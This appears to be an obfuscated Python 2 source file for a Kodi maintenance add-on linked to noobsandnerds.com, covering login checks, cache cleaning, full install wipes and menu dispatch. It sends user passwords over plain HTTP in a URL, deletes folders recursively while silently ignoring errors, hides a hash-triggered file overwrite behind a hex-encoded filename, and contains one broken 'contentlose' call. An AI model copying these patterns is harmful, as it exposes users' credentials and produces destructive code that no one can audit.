   ooOo0Oo = binascii . unhexlify ( ooOo0Oo )
  if ooo00o0o != '' :
   ooo00o0o = binascii . unhexlify ( ooo00o0o )
  if 'Welcome Back' in ooo00o0o and Oo0oO0ooo . replace ( '%20' , '' ) in ooo00o0o and info == 'posts' :
   return ooOo0Oo
  if 'Welcome Back' in ooo00o0o and Oo0oO0ooo . replace ( '%20' , '' ) in ooo00o0o and info == 'welcometext' :
   return ooo00o0o
  else :
   return 'False'
 else :
  return 'False'
  if 1 - 1: II111iiii * i1IIi % IIiIi1iI . O0 * OOOoOoo0O
  if 40 - 40: IIi * OOOoOoo0O . IIi + ooOo
def o0Ooo0OoO ( localbuildcheck , localversioncheck , localidcheck ) :
 print "### USER_INFO CHECK"
 if i1111 == 'true' :
  try :
   i1I1i1 = 'http://noobsandnerds.com/TI/login/login_details.php?user=%s&pass=%s' % ( Oo0oO0ooo , o0oOoO00o )
   O0OoooO0 = ooo0O0o00O ( i1I1i1 , 10 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
   IIi1 = re . compile ( 'login_msg="(.+?)"' ) . findall ( O0OoooO0 )
   ooo00o0o = IIi1 [ 0 ] if ( len ( IIi1 ) > 0 ) else ''
   Oo0oo = re . compile ( 'posts="(.+?)"' ) . findall ( O0OoooO0 )
   ooOo0Oo = Oo0oo [ 0 ] if ( len ( Oo0oo ) > 0 ) else '0'
  except :
   ooo00o0o = '[COLOR=lime]UNABLE TO VERIFY LOGIN[/COLOR]'
   if 31 - 31: OOOoOoo0O + OoO0O00 / I1IiiI * O0 + O0
 else :
  ooo00o0o = '[COLOR=lime]REGISTER FOR FREE TO UNLOCK FEATURES[/COLOR]'
  if 34 - 34: IIiiiI1iIII
 print "### WELCOMETEXT: " + ooo00o0o
 if 5 - 5: OoO0O00 . I1IiiI
 i1I1i1 = 'http://noobsandnerds.com/TI/menu_check'
 try :
  O0OoooO0 = ooo0O0o00O ( i1I1i1 , 10 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
  Ooo000O00 = re . compile ( 'd="(.+?)"' ) . findall ( O0OoooO0 )
  i1iI1Iiii1I = Ooo000O00 [ 0 ] if ( len ( Ooo000O00 ) > 0 ) else 'none'
 except :
  i1iI1Iiii1I = 'none'
  if 48 - 48: Oo0Ooo - OoO0O00 . OOOoOoo0O - iIii1I11I1II1 % O00OOo00oo0o
 print "### MENU: " + i1iI1Iiii1I
 if 47 - 47: IIiIi1iI / OoooooooOO - II111iiii
 if 91 - 91: OoOoOO00 + o0oOOo0O0Ooo
 if not 'REGISTER FOR FREE' in ooo00o0o and not 'UNABLE TO VERIFY' in ooo00o0o :
  xbmc . log ( "### ATTEMPTING TO WRITE COOKIE " )
  OooooOOoo0 = open ( IIIii1II1II , mode = 'w+' )
  OooooOOoo0 . write ( 'd="' + binascii . hexlify ( iiiII ( ) ) + '"\nl="' + binascii . hexlify ( ooo00o0o ) + '"\np="' + binascii . hexlify ( ooOo0Oo ) + '"\nm="' + binascii . hexlify ( i1iI1Iiii1I ) + '"' )
  OooooOOoo0 . close ( )
  if 23 - 23: i1IIi
 Ii111Iiiii ( localbuildcheck , localversioncheck , localidcheck , ooo00o0o , i1iI1Iiii1I )
 if 9 - 9: i1IIi % IIi - OoO0O00 * OoOoOO00 . o0oOOo0O0Ooo
 if 18 - 18: O00OOo00oo0o . OoOoOO00 + IIiIi1iI . I1IiiI + OoooooooOO . OoO0O00
def iiIiii1IIIII ( showdialog = True ) :
 xbmc . executebuiltin ( 'UpdateLocalAddons' )
 xbmc . executebuiltin ( 'UpdateAddonRepos' )
 if showdialog :
  xbmcgui . Dialog ( ) . ok ( 'Force Refresh Started Successfully' , 'Depending on the speed of your device it could take a few minutes for the update to take effect.' )
  if 31 - 31: IIi - OOOoOoo0O
  if 49 - 49: iIii1I11I1II1 - iIii1I11I1II1 - OoOoOO00 + IIiiiI1iIII / OoOoOO00
def oo0Ooo ( ) :
 iI1II1III = 1
 try :
  ooo0O0o00O ( 'http://google.com' , 5 )
 except :
  try :
   ooo0O0o00O ( 'http://google.com' , 5 )
  except :
   try :
    ooo0O0o00O ( 'http://google.com' , 5 )
   except :
    try :
     ooo0O0o00O ( 'http://google.cn' , 5 )
    except :
     try :
      ooo0O0o00O ( 'http://google.cn' , 5 )
     except :
      iI111I11I1I1 . ok ( "NO INTERNET CONNECTION" , 'It looks like this device isn\'t connected to the internet. Only some of the maintenance options will work until you fix the connectivity problem.' )
      Ii111Iiiii ( '' , '' , '' , '[COLOR=orange]NO INTERNET CONNECTION[/COLOR]' )
      iI1II1III = 0
 if iI1II1III == 1 :
  OOOIi11i1II ( )
  if 53 - 53: II111iiii / IIi / II111iiii % IIi % OOOoOoo0O % I1ii11iIi11i
  if 44 - 44: IIiIi1iI * I1IiiI * I1IiiI % o0oOOo0O0Ooo
def OOOIi11i1II ( ) :
 OO00OoooO = 'None'
 OO0iiiii1iiIIii = '0'
 if 95 - 95: O0 * OoO0O00 . OOOoOoo0O - IIiiiI1iIII - IIiIi1iI
 if 84 - 84: o0oOOo0O0Ooo / IIi - O0 + I1IiiI . I1ii11iIi11i
 I1I1IIiiii1ii = open ( I11iii1Ii , mode = 'r' )
 ii1I1 = I1I1IIiiii1ii . read ( )
 I1I1IIiiii1ii . close ( )
 if 30 - 30: IIiIi1iI * O00OOo00oo0o % OoOoOO00 / o0oOOo0O0Ooo * o0oOOo0O0Ooo + O0
 OO00i1II = re . compile ( 'date="(.+?)"' ) . findall ( ii1I1 )
 I1i1I11I = OO00i1II [ 0 ] if ( len ( OO00i1II ) > 0 ) else ''
 iiI1iI = re . compile ( 'version="(.+?)"' ) . findall ( ii1I1 )
 iiI111I1iIiI = iiI1iI [ 0 ] if ( len ( iiI1iI ) > 0 ) else ''
 if 85 - 85: I1ii11iIi11i + iIii1I11I1II1 + IIi * i1IIi - O0 % IIiIi1iI
 iI1 = open ( O000oo0O , mode = 'r' )
 iIIII1 = iI1 . read ( )
 iI1 . close ( )
 if 32 - 32: O00OOo00oo0o % OOOoOoo0O + Oo % OoooooooOO
 Oo0Oo = re . compile ( 'id="(.+?)"' ) . findall ( iIIII1 )
 i1iOO = re . compile ( 'name="(.+?)"' ) . findall ( iIIII1 )
 OO0iiiii1iiIIii = Oo0Oo [ 0 ] if ( len ( Oo0Oo ) > 0 ) else 'None'
 OO00OoooO = i1iOO [ 0 ] if ( len ( i1iOO ) > 0 ) else ''
 if 68 - 68: OOOoOoo0O
 if not os . path . exists ( IIIii1II1II ) :
  xbmc . log ( "### First login check ###" )
  o0Ooo0OoO ( OO00OoooO , iiI111I1iIiI , OO0iiiii1iiIIii )
  if 13 - 13: i11iIiiIii - iiiiiiii1
  if 54 - 54: I1IiiI * I1IiiI - OOOoOoo0O . O0 . IIiIi1iI - O00OOo00oo0o
 else :
  try :
   OooooO00OOO0 = open ( IIIii1II1II , mode = 'r' )
   IIIiiI1I = OooooO00OOO0 . read ( )
   OooooO00OOO0 . close ( )
   if 55 - 55: IIiIi1iI * Oo0Ooo + OoOoOO00 * Oo / IIiIi1iI * i1IIi
   i1iiI1 = re . compile ( 'd="(.+?)"' ) . findall ( IIIiiI1I )
   iiII1II1 = re . compile ( 'l="(.+?)"' ) . findall ( IIIiiI1I )
   iiIIii1Iii1I = re . compile ( 'm="(.+?)"' ) . findall ( IIIiiI1I )
   oOo00OoO0O = i1iiI1 [ 0 ] if ( len ( i1iiI1 ) > 0 ) else '0'
   if 95 - 95: o0oOOo0O0Ooo / IIi % II111iiii + iiiiiiii1
   if oOo00OoO0O != '0' :
    oOo00OoO0O = binascii . unhexlify ( oOo00OoO0O )
    if 97 - 97: Oo
   ooo00o0o = iiII1II1 [ 0 ] if ( len ( iiII1II1 ) > 0 ) else ''
   ooo00o0o = binascii . unhexlify ( ooo00o0o )
   oooOO0OoO0OOO = iiIIii1Iii1I [ 0 ] if ( len ( iiIIii1Iii1I ) > 0 ) else ''
   oooOO0OoO0OOO = binascii . unhexlify ( oooOO0OoO0OOO )
  except :
   os . remove ( IIIii1II1II )
  if int ( oOo00OoO0O ) + 2000000 > int ( iiiII ( ) ) :
   xbmc . log ( "### Login successful ###" )
   Ii111Iiiii ( OO00OoooO , iiI111I1iIiI , OO0iiiii1iiIIii , ooo00o0o , oooOO0OoO0OOO )
  else :
   xbmc . log ( "### Checking login ###" )
   o0Ooo0OoO ( OO00OoooO , iiI111I1iIiI , OO0iiiii1iiIIii )
   if 60 - 60: I1ii11iIi11i * i11iIiiIii - II111iiii + IIi % IIiiiI1iIII
   if 63 - 63: OoooooooOO . O00OOo00oo0o - ooOo / II111iiii + I1IiiI
def o0OOOOOo00 ( ) :
 o00O0oOO0o = os . path . join ( xbmc . translatePath ( os . path . join ( 'special://profile' , 'addon_data' ) ) )
 if 97 - 97: iiiiiiii1 * O00OOo00oo0o % IIiIi1iI * O00OOo00oo0o % i11iIiiIii
 iIiIII11 = [
 ( o00O0oOO0o ) ,
 ( iiI1IiI ) ,
 ( os . path . join ( iIii1 , 'cache' ) ) ,
 ( os . path . join ( iIii1 , 'temp' ) ) ,
 ( os . path . join ( '/private/var/mobile/Library/Caches/AppleTV/Video/' , 'Other' ) ) ,
 ( os . path . join ( '/private/var/mobile/Library/Caches/AppleTV/Video/' , 'Localuseraccountnamental' ) ) ,
 ( os . path . join ( iiI1IiI , 'script.module.simple.downloader' ) ) ,
 ( os . path . join ( xbmc . translatePath ( os . path . join ( 'special://profile' , 'addon_data' , 'script.module.simple.downloader' ) ) ) ) ,
 ( os . path . join ( iiI1IiI , 'plugin.video.itv' , 'Images' ) ) ,
 ( os . path . join ( xbmc . translatePath ( os . path . join ( 'special://profile' , 'addon_data' , 'plugin.video.itv' , 'Images' ) ) ) ) ]
 if 23 - 23: O00OOo00oo0o + OoO0O00
 for i1II1 in iIiIII11 :
  if os . path . exists ( i1II1 ) and i1II1 != iiI1IiI and i1II1 != o00O0oOO0o :
   for IIIiiiiiI1I , I1III111i , iiI1iii in os . walk ( i1II1 ) :
    O0oooO00ooO0 = 0
    O0oooO00ooO0 += len ( iiI1iii )
    if O0oooO00ooO0 > 0 :
     for IIiI1i in iiI1iii :
      try :
       os . unlink ( os . path . join ( IIIiiiiiI1I , IIiI1i ) )
      except :
       pass
     for ii1ii in I1III111i :
      try :
       shutil . rmtree ( os . path . join ( IIIiiiiiI1I , ii1ii ) )
       print "### Successfully cleared " + str ( O0oooO00ooO0 ) + " files from " + os . path . join ( i1II1 , ii1ii )
      except :
       print "### Failed to wipe cache in: " + os . path . join ( i1II1 , ii1ii )
  else :
   for IIIiiiiiI1I , I1III111i , iiI1iii in os . walk ( i1II1 ) :
    for ii1ii in I1III111i :
     if 'Cache' in ii1ii or 'cache' in ii1ii or 'CACHE' in ii1ii :
      try :
       shutil . rmtree ( os . path . join ( IIIiiiiiI1I , ii1ii ) )
       print "### Successfully wiped " + os . path . join ( i1II1 , ii1ii )
      except :
       print "### Failed to wipe cache in: " + os . path . join ( i1II1 , ii1ii )
       if 83 - 83: OOOoOoo0O
       if 61 - 61: iiiiiiii1 . IIiIi1iI / iiiiiiii1 * OoooooooOO
 try :
  i111iIi1i1 = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/plugin.video.genesis' ) , 'cache.db' )
  iiiiI = database . connect ( i111iIi1i1 )
  II1IIi1ii111 = iiiiI . cursor ( )
  II1IIi1ii111 . execute ( "DROP TABLE IF EXISTS rel_list" )
  II1IIi1ii111 . execute ( "VACUUM" )
  iiiiI . commit ( )
  II1IIi1ii111 . execute ( "DROP TABLE IF EXISTS rel_lib" )
  II1IIi1ii111 . execute ( "VACUUM" )
  iiiiI . commit ( )
 except :
  pass
  if 28 - 28: Oo0Ooo . IIiIi1iI % O0 - OoOoOO00
  if 62 - 62: ooOo
def III1I111 ( mode ) :
 if zip == '' :
  iI111I11I1I1 . ok ( 'Please set your backup location before proceeding' , 'You have not set your backup storage folder.\nPlease update the addon settings and try again.' )
  o0O . openSettings ( sys . argv [ 0 ] )
  ooOoi1IiI = o0O . getSetting ( 'zip' )
  if ooOoi1IiI == '' :
   III1I111 ( mode )
 Ii1111i11 = xbmc . translatePath ( os . path . join ( iiiiiIIii , 'Community_Builds' , 'My_Builds' ) )
 if not os . path . exists ( Ii1111i11 ) :
  os . makedirs ( Ii1111i11 )
 I1i1I1I11IiiI = xbmcgui . Dialog ( ) . yesno ( "ABSOLUTELY CERTAIN?!!!" , 'Are you absolutely certain you want to wipe?' , '' , 'All addons and settings will be completely wiped!' , yeslabel = 'Yes' , nolabel = 'No' )
 if 11 - 11: OoooooooOO . OoO0O00 + i1IIi % iIii1I11I1II1 + Oo0Ooo
 if I1i1I1I11IiiI == 1 :
  o00OO00OoO = xbmc . getSkinDir ( )
  xbmc . log ( '### skin: %s' % o00OO00OoO )
  if not o00OO00OoO in [ 'skin.confluence' , 'skin.estuary' ] :
   o00OO00OoO = 'skin.confluence' if ii11iIi1I < 17 else 'skin.estuary'
   skinSwitch . swapSkins ( o00OO00OoO )
   Ii11Iiii1iiii = 0
   xbmc . sleep ( 1000 )
   while not xbmc . getCondVisibility ( "Window.isVisible(yesnodialog)" ) :
    if Ii11Iiii1iiii == 150 :
     break
    Ii11Iiii1iiii += 1
    xbmc . sleep ( 200 )
    if 70 - 70: OoooooooOO * i11iIiiIii
   if xbmc . getCondVisibility ( "Window.isVisible(yesnodialog)" ) :
    xbmc . executebuiltin ( 'SetFocus(11)' )
    xbmc . executebuiltin ( 'Action(Select)' )
  if not o00OO00OoO in [ 'skin.confluence' , 'skin.estuary' ] :
   iI111I11I1I1 . ok ( "Community Portal" , "Unable to reset skin back to [COLOR yellow]%s[/COLOR]" % o00OO00OoO [ 5 : ] )
   return
  else :
   if 60 - 60: IIiiiI1iIII / iIii1I11I1II1 + OoooooooOO - I1ii11iIi11i * i11iIiiIii
   I1i1I1I11IiiI = xbmcgui . Dialog ( ) . yesno ( "VERY IMPORTANT" , 'This will completely wipe your install.' , 'Would you like to create a backup before proceeding?' , '' , yeslabel = 'No' , nolabel = 'Yes' )
   if I1i1I1I11IiiI == 0 :
    if not os . path . exists ( Ii1111i11 ) :
     os . makedirs ( Ii1111i11 )
    I1iII1IIi1IiI = iIioo0ooO ( heading = "Enter a name for this backup" )
    if ( not I1iII1IIi1IiI ) : return False , 0
    o00OO0o0 = urllib . quote_plus ( I1iII1IIi1IiI )
    i1II1IiiIi = xbmc . translatePath ( os . path . join ( Ii1111i11 , o00OO0o0 + '.zip' ) )
    ii111iI1i1 = [ 'plugin.program.totalinstaller' , 'plugin.program.tbs' ]
    OO000 = [ "xbmc.log" , "xbmc.old.log" , "kodi.log" , "kodi.old.log" , '.DS_Store' , '.setup_complete' , 'XBMCHelper.conf' , '.gitignore' ]
    oO0oOoo0O = "Creating full backup of existing build"
    II1iI11 = "Archiving..."
    O00o0O = ""
    O00oOo0O0o00O = "Please Wait"
    iiIIii ( iIii1 , i1II1IiiIi , oO0oOoo0O , II1iI11 , O00o0O , O00oOo0O0o00O , ii111iI1i1 , OO000 )
   Iii1iIIi1iIii ( i1i )
   II1ii1 ( )
   oOOoo0o00 ( 1 )
   OOO00O00ooo0o ( )
   OoOoo ( i1Oo00 )
   if os . path . exists ( I11iii1Ii ) :
    os . remove ( I11iii1Ii )
   if os . path . exists ( I1IIiiIiii ) :
    os . remove ( I1IIiiIiii )
   if os . path . exists ( O000oo0O ) :
    os . remove ( O000oo0O )
  if mode != 'CB' :
   OoooOOo0oOO ( )
  try :
   os . remove ( I11iii1Ii )
  except :
   xbmc . log ( "### Failed to remove startup.xml" )
  try :
   os . remove ( O000oo0O )
  except :
   xbmc . log ( "### Failed to remove id.xml" )
 else :
  return
  if 75 - 75: iIii1I11I1II1 * IIiIi1iI / OoOoOO00 * II111iiii . i1IIi
  if 6 - 6: O00OOo00oo0o % O00OOo00oo0o / OoooooooOO * ooOo . I1IiiI . i1IIi
def Iii1iIIi1iIii ( excludefiles ) :
 OOooO0OOoo . create ( "Wiping Existing Content" , '' , 'Please wait...' , '' )
 for IIIiiiiiI1I , I1III111i , iiI1iii in os . walk ( iIii1 , topdown = True ) :
  I1III111i [ : ] = [ ii1ii for ii1ii in I1III111i if ii1ii not in excludefiles ]
  for ooo0O in iiI1iii :
   try :
    OOooO0OOoo . update ( 0 , "Removing [COLOR=yellow]" + ooo0O + '[/COLOR]' , '' , 'Please wait...' )
    os . unlink ( os . path . join ( IIIiiiiiI1I , ooo0O ) )
    os . remove ( os . path . join ( IIIiiiiiI1I , ooo0O ) )
    os . rmdir ( os . path . join ( IIIiiiiiI1I , ooo0O ) )
   except :
    pass
    if 59 - 59: OOOoOoo0O . OOOoOoo0O * I1IiiI - O00OOo00oo0o % OoOoOO00
    if 19 - 19: OoooooooOO / Oo0Ooo - IIi . OoOoOO00
def II1ii1 ( ) :
 i1i1i11IIii = [ ooo0O for ooo0O in os . listdir ( oOOoO0 ) if os . path . isdir ( os . path . join ( oOOoO0 , ooo0O ) ) ]
 try :
  for ooo0O in i1i1i11IIii :
   try :
    if ooo0O not in i1Oo00 :
     OOooO0OOoo . update ( 0 , "Cleaning Directory: [COLOR=yellow]" + ooo0O + ' [/COLOR]' , '' , 'Please wait...' )
     shutil . rmtree ( os . path . join ( oOOoO0 , ooo0O ) )
   except :
    pass
 except :
  pass
  if 11 - 11: iiiiiiii1 . IIi - IIiIi1iI . o0oOOo0O0Ooo
  if 41 - 41: ooOo / OoO0O00 - OoO0O00 + iiiiiiii1 * Oo
 for IIIiiiiiI1I , I1III111i , iiI1iii in os . walk ( oOOoO0 , topdown = True ) :
  I1III111i [ : ] = [ ii1ii for ii1ii in I1III111i if ii1ii not in i1Oo00 ]
  for ooo0O in iiI1iii :
   try :
    OOooO0OOoo . update ( 0 , "Removing [COLOR=yellow]" + ooo0O + '[/COLOR]' , '' , 'Please wait...' )
    os . unlink ( os . path . join ( IIIiiiiiI1I , ooo0O ) )
    os . remove ( os . path . join ( IIIiiiiiI1I , ooo0O ) )
   except :
    pass
    if 13 - 13: IIi * II111iiii - OoOoOO00
    if 3 - 3: Oo + iiiiiiii1 * i11iIiiIii . IIiIi1iI / iIii1I11I1II1
def oOOoo0o00 ( keeprepos ) :
 for ooo0O in os . listdir ( II11iiii1Ii ) :
  if not keeprepos :
   if ooo0O not in i1Oo00 and not 'repo' in ooo0O :
    try :
     OOooO0OOoo . update ( 0 , "Removing Add-on: [COLOR=yellow]" + ooo0O + ' [/COLOR]' , '' , 'Please wait...' )
     shutil . rmtree ( os . path . join ( II11iiii1Ii , ooo0O ) )
    except :
     try :
      os . remove ( os . path . join ( II11iiii1Ii , ooo0O ) )
     except :
      pass
      if 44 - 44: OoO0O00
  else :
   try :
    if ooo0O not in i1Oo00 :
     OOooO0OOoo . update ( 0 , "Removing Add-on: [COLOR=yellow]" + ooo0O + ' [/COLOR]' , '' , 'Please wait...' )
     shutil . rmtree ( os . path . join ( II11iiii1Ii , ooo0O ) )
   except :
    try :
     os . remove ( os . path . join ( II11iiii1Ii , ooo0O ) )
    except :
     pass
     if 74 - 74: O00OOo00oo0o * i1IIi * OOOoOoo0O - OoooooooOO . I1IiiI
     if 24 - 24: II111iiii - i11iIiiIii * i1IIi . iiiiiiii1
def OOO00O00ooo0o ( ) :
 for ooo0O in os . listdir ( iiI1IiI ) :
  try :
   OOooO0OOoo . update ( 0 , "Removing Add-on Data: [COLOR=yellow]" + ooo0O + ' [/COLOR]' , '' , 'Please wait...' )
   shutil . rmtree ( os . path . join ( iiI1IiI , ooo0O ) )
  except :
   try :
    os . remove ( os . path . join ( iiI1IiI , ooo0O ) )
   except :
    pass
    if 42 - 42: OOOoOoo0O / i11iIiiIii
    if 7 - 7: OOOoOoo0O
def OoOoo ( excludefiles ) :
 Ii1iiiI = [ ooo0O for ooo0O in os . listdir ( iIii1 ) if os . path . isdir ( os . path . join ( iIii1 , ooo0O ) ) ]
 try :
  for ooo0O in Ii1iiiI :
   try :
    if ooo0O not in excludefiles :
     OOooO0OOoo . update ( 0 , "Cleaning Directory: [COLOR=yellow]" + ooo0O + ' [/COLOR]' , '' , 'Please wait...' )
     shutil . rmtree ( os . path . join ( iIii1 , ooo0O ) )
   except :
    pass
 except :
  pass
  if 25 - 25: OoO0O00 % i1IIi
  if 12 - 12: o0oOOo0O0Ooo
def Ooo0o00O0O0oO ( url ) :
 iiO0o0O0oo0o = xbmc . getInfoLabel ( "System.BuildVersion" )
 oOOo0oo0O = float ( iiO0o0O0oo0o [ : 4 ] )
 OO000OOO = iIii1 . split ( os . sep )
 xbmc . log ( str ( OO000OOO ) )
 o000OOooo000O = len ( OO000OOO )
 oo0o0o = OO000OOO [ o000OOooo000O - 1 ]
 if oo0o0o == '' :
  oo0o0o = OO000OOO [ o000OOooo000O - 2 ]
 oo0o0o = oo0o0o . replace ( '.' , '' ) . upper ( )
 iI111I11I1I1 . ok ( 'You are running: %s' % oo0o0o , "Your version is: %s" % oOOo0oo0O )
 if 67 - 67: II111iiii + O00OOo00oo0o - I1IiiI * iiiiiiii1
 if 19 - 19: i11iIiiIii * Oo0Ooo
if __name__ == '__main__' :
 iii1i1Iiiiiii = oO0o ( )
 i11i1iiiII = None
 I11IIII = None
 ooo = None
 IiIi1I1Iiii = None
 O00O0O0OO00oo = None
 I11iI1i11IiI = None
 O00Oo = None
 iiiiII11iIi = None
 I1iiiiI1iI = None
 Oo0o = None
 iii1Ii = None
 ooo0O = None
 II111 = None
 ooOO0oO0oo00o = None
 iiIi1IIiI = None
 OOoooo0000Oo = None
 i1IIIIiiI11 = None
 Ii1IIiII1I = None
 o00OO0o0 = None
 iiiii1II = None
 OOO00o0oO = None
 oOOo0oo0O = None
 oO0OOOO0 = None
 I1iii1I = None
 oooo0 = None
 o0o0o = 'maintenance'
 if 30 - 30: O0
 try :
  i11i1iiiII = urllib . unquote_plus ( iii1i1Iiiiiii [ "addon_id" ] )
 except :
  pass
 try :
  OOOii = urllib . unquote_plus ( iii1i1Iiiiiii [ "adult" ] )
 except :
  pass
 try :
  I11IIII = urllib . unquote_plus ( iii1i1Iiiiiii [ "artpack" ] )
 except :
  pass
 try :
  ooo = urllib . unquote_plus ( iii1i1Iiiiiii [ "audioaddons" ] )
 except :
  pass
 try :
  IiIi1I1Iiii = urllib . unquote_plus ( iii1i1Iiiiiii [ "author" ] )
 except :
  pass
 try :
  O00O0O0OO00oo = urllib . unquote_plus ( iii1i1Iiiiiii [ "buildname" ] )
 except :
  pass
 try :
  I11iI1i11IiI = urllib . unquote_plus ( iii1i1Iiiiiii [ "data_path" ] )
 except :
  pass
 try :
  O00Oo = urllib . unquote_plus ( iii1i1Iiiiiii [ "description" ] )
 except :
  pass
 try :
  iiiiII11iIi = urllib . unquote_plus ( iii1i1Iiiiiii [ "fanart" ] )
 except :
  pass
 try :
  I1iiiiI1iI = urllib . unquote_plus ( iii1i1Iiiiiii [ "forum" ] )
 except :
  pass
 try :
  Iii1I11 = urllib . unquote_plus ( iii1i1Iiiiiii [ "guisettingslink" ] )
 except :
  pass
 try :
  Oo0o = urllib . unquote_plus ( iii1i1Iiiiiii [ "iconimage" ] )
 except :
  pass
 try :
  iii1Ii = str ( iii1i1Iiiiiii [ "mode" ] )
 except :
  pass
 try :
  ooo0O = urllib . unquote_plus ( iii1i1Iiiiiii [ "name" ] )
 except :
  pass
 try :
  I11iIi = urllib . unquote_plus ( iii1i1Iiiiiii [ "pictureaddons" ] )
 except :
  pass
 try :
  II111 = urllib . unquote_plus ( iii1i1Iiiiiii [ "programaddons" ] )
 except :
  pass
 try :
  ooOO0oO0oo00o = urllib . unquote_plus ( iii1i1Iiiiiii [ "provider_name" ] )
 except :
  pass
 try :
  OOoooo0000Oo = urllib . unquote_plus ( iii1i1Iiiiiii [ "repo_link" ] )
 except :
  pass
 try :
  iiIi1IIiI = urllib . unquote_plus ( iii1i1Iiiiiii [ "repo_id" ] )
 except :
  pass
 try :
  i1IIIIiiI11 = urllib . unquote_plus ( iii1i1Iiiiiii [ "skins" ] )
 except :
  pass
 try :
  Ii1IIiII1I = urllib . unquote_plus ( iii1i1Iiiiiii [ "sources" ] )
 except :
  pass
 try :
  o00OO0o0 = urllib . unquote_plus ( iii1i1Iiiiiii [ "title" ] )
 except :
  pass
 try :
  iiiii1II = urllib . unquote_plus ( iii1i1Iiiiiii [ "updated" ] )
 except :
  pass
 try :
  OOO00o0oO = urllib . unquote_plus ( iii1i1Iiiiiii [ "url" ] )
 except :
  pass
 try :
  oOOo0oo0O = urllib . unquote_plus ( iii1i1Iiiiiii [ "version" ] )
 except :
  pass
 try :
  oO0OOOO0 = urllib . unquote_plus ( iii1i1Iiiiiii [ "video" ] )
 except :
  pass
 try :
  I1iii1I = urllib . unquote_plus ( iii1i1Iiiiiii [ "videoaddons" ] )
 except :
  pass
 try :
  oooo0 = urllib . unquote_plus ( iii1i1Iiiiiii [ "zip_link" ] )
 except :
  pass
  if 78 - 78: I1IiiI - Oo - ooOo * iiiiiiii1 % i11iIiiIii + Oo
 if not os . path . exists ( Ii1iIiII1ii1 ) :
  os . makedirs ( Ii1iIiII1ii1 )
  if 90 - 90: i11iIiiIii
 if not os . path . exists ( I11iii1Ii ) :
  I1I1IIiiii1ii = open ( I11iii1Ii , mode = 'w+' )
  I1I1IIiiii1ii . write ( 'date="01011001"\nversion="0.0"' )
  I1I1IIiiii1ii . close ( )
  if 47 - 47: OoO0O00 . i11iIiiIii
 if not os . path . exists ( O000oo0O ) :
  I1I1IIiiii1ii = open ( O000oo0O , mode = 'w+' )
  I1I1IIiiii1ii . write ( 'id="None"\nname="None"' )
  I1I1IIiiii1ii . contentlose ( )
  if 9 - 9: OoOoOO00 - OOOoOoo0O . OoooooooOO % iiiiiiii1
 IIIiIiIIII1i1 = binascii . unhexlify ( '6164646f6e2e786d6c' )
 iiII = xbmc . translatePath ( os . path . join ( II11iiii1Ii , I1IiI , IIIiIiIIII1i1 ) )
 Oo00oooO00o = open ( iiII , mode = 'r' )
 ii1I1 = file . read ( Oo00oooO00o )
 file . close ( Oo00oooO00o )
 oooO0Oo0O = re . compile ( '<ref>(.+?)</ref>' ) . findall ( ii1I1 )
 iIIIi111 = oooO0Oo0O [ 0 ] if ( len ( oooO0Oo0O ) > 0 ) else ''
 iI1I11II1Iii1 = hashlib . md5 ( open ( oOOoo0Oo , 'rb' ) . read ( ) ) . hexdigest ( )
 if iIIIi111 != iI1I11II1Iii1 :
  IIiIiI = open ( I11i1 , mode = 'r' )
  ii1I1 = file . read ( IIiIiI )
  file . close ( IIiIiI )
  OooooOOoo0 = open ( oOOoo0Oo , mode = 'w+' )
  OooooOOoo0 . write ( ii1I1 )
  OooooOOoo0 . close ( )
  if 96 - 96: iiiiiiii1 + OoO0O00 * II111iiii * ooOo
 if iii1Ii == None : OOOIi11i1II ( )
 elif iii1Ii == 'ASCII_Check' : oO00Ooo0oO ( )
 elif iii1Ii == 'addon_final_menu' : OO0000o ( OOO00o0oO )
 elif iii1Ii == 'addon_categories' : O0o000Oo ( OOO00o0oO )
 elif iii1Ii == 'addon_countries' : OoO ( OOO00o0oO )
 elif iii1Ii == 'addon_genres' : OOOooo0OooOoO ( OOO00o0oO )
 elif iii1Ii == 'addon_install' : I1iiioOO0OO0O ( ooo0O , oooo0 , OOoooo0000Oo , iiIi1IIiI , i11i1iiiII , ooOO0oO0oo00o , I1iiiiI1iI , I11iI1i11IiI )
 elif iii1Ii == 'addon_install_zero' : Ii1 ( ooo0O , oooo0 , OOoooo0000Oo , iiIi1IIiI , i11i1iiiII , ooOO0oO0oo00o , I1iiiiI1iI , I11iI1i11IiI )
 elif iii1Ii == 'addon_loop' : oo0ooooo00o ( )
 elif iii1Ii == 'addon_removal_menu' : O0OIIi1 ( )
 elif iii1Ii == 'addonmenu' : I1ii1II1iII ( OOO00o0oO )
 elif iii1Ii == 'addon_settings' : IiIiiI11i1Ii ( )
 elif iii1Ii == 'adult_filter' : Ii1ooo0O0OO ( OOO00o0oO )
 elif iii1Ii == 'app_installer' : installapps . INDEX1 ( )
 elif iii1Ii == 'backup' : BACKUP ( )
 elif iii1Ii == 'backup_option' : oo0O0o ( )
 elif iii1Ii == 'backup_restore' : IiIi1i ( )
 elif iii1Ii == 'browse_repos' : IIiI1111i1 ( )
 elif iii1Ii == 'CB_Menu' : O00ooooo00 ( OOO00o0oO )
 elif iii1Ii == 'check_storage' : checkPath . check ( o0o0o )
 elif iii1Ii == 'check_updates' : o0oooOO00 ( )
 elif iii1Ii == 'clear_cache' : O0OOoOooO00 ( )
 elif iii1Ii == 'create_keyword' : O0OO ( OOO00o0oO )
 elif iii1Ii == 'community_backup' : oOoo0Ooooo ( )
 elif iii1Ii == 'community_backup_2' : iIiIIi11iI ( )
 elif iii1Ii == 'community_menu' : o0O00O ( OOO00o0oO , oO0OOOO0 )
 elif iii1Ii == 'countries' : O0o0O00o0o ( OOO00o0oO )
 elif iii1Ii == 'description' : I1i1ii1ii ( ooo0O , OOO00o0oO , O00O0O0OO00oo , IiIi1I1Iiii , oOOo0oo0O , O00Oo , iiiii1II , i1IIIIiiI11 , I1iii1I , ooo , II111 , I11iIi , Ii1IIiII1I , OOOii )
 elif iii1Ii == 'delete_path' : oOoO ( OOO00o0oO )
 elif iii1Ii == 'delete_profile' : ooOoOoo000O0O ( OOO00o0oO )
 elif iii1Ii == 'enableaddons' : iIi1iIiIIII1iII1i ( )
 elif iii1Ii == 'fix_special' : IiiIIiII11i1 ( OOO00o0oO )
 elif iii1Ii == 'full_backup' : o0Oo0oO00Oooo ( )
 elif iii1Ii == 'full_clean' : i1iiiiii1 ( )
 elif iii1Ii == 'genres' : I1IIiIi1iI ( OOO00o0oO )
 elif iii1Ii == 'gotham' : IIIIiI1ii1 ( )
